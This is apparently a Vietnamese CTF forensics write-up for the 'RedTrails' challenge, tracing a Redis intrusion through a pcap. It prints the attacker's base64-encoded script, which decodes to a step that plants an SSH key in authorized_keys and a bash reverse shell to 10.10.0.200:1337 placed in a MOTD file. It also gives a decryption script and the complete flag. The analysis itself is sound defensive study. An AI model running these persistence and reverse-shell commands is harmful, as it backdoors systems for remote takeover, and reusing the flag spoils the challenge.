# RedTrails - 40 points

**Author**: Nauten  
**Category**: Forensics  

## Challenge Description
> Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.

---

Tài nguyên của challenge chỉ có 1 file `capture.pcap`. Lướt một tí trong wireshark thì thấy có package

![](asset/Red%20Trails/image/1.png)

File này là một obfuscated shell script 

![](asset/Red%20Trails/image/2.png)

Đổi nhẹ `eval` thành `echo` rồi chạy xem nó là gì

![](asset/Red%20Trails/image/3.png)

Vẫn còn encode, decode tiếp phát nữa
```bash
LQebW="ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL"        
gVR7i="M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52"      
bkzHk="bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH"        
q97up="ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s"        GYJan="bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK"        
HJj6A="UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr"        fD9Kc="R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3"        hpAgs="SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp"                FqOPN="emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw"        CpJLT="Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5"                
PIx1p="cw=="
echo "$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p" | base64 -d

ABvnz='ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'        
QOPjH='jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'        
gQIxX='ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'
echo "$ABvnz$QOPjH$gQIxX" | base64 -d
```

![](asset/Red%20Trails/image/4.png)

Tìm thấy phần đầu flag: `HTB{r3d15_1n574nc35`
Đề bài cho biết flag có 3 phần, đi tìm tiếp trong file `pcap` thôi. 
Follow TCP Stream của vài gói đầu thử xem, lướt xuống cuối thì thấy đoạn giữa ._.

![](asset/Red%20Trails/image/5.png)

`FLAG_PART:_c0uld_0p3n_n3w`
Hai phần flag đầu được tìm thấy trong tcp.stream eq 0 và 1, thử xem eq 2 có gì thì thấy lệnh tải file nhưng ban đầu không thấy file này trong Network Miner, phần data phía sau nhìn như mã hóa. Có lẽ đây là data mã hóa của file

![](asset/Red%20Trails/image/6.png)

Lướt tiếp trong tcpstream, đến eq 6 thì thấy thêm thông tin mới

![](asset/Red%20Trails/image/7.png)

Thấy loáng thoáng aes 256 mode cbc, chắc stream này chứa thông tin mã hóa của data trên. Lướt xuống tí nữa thì thấy hai value có vẻ như là key và IV

![](asset/Red%20Trails/image/8.png)

Script decrypt

```python
from Crypto.Cipher import AES
import base64
import binascii

key_b64 = b"h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz"
iv_b64  = b"YDP7ECjzuV7sagMN"

hex_data = "394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952"

ciphertext = binascii.unhexlify(hex_data.strip().replace('\n', '').replace(' ', ''))

cipher = AES.new(key_b64, AES.MODE_CBC, iv_b64)
plaintext = cipher.decrypt(ciphertext)

print(plaintext.decode(errors="replace"))
```

Thấy phần flag còn lại rồi

![](asset/Red%20Trails/image/9.png)

Flag: `HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}`

---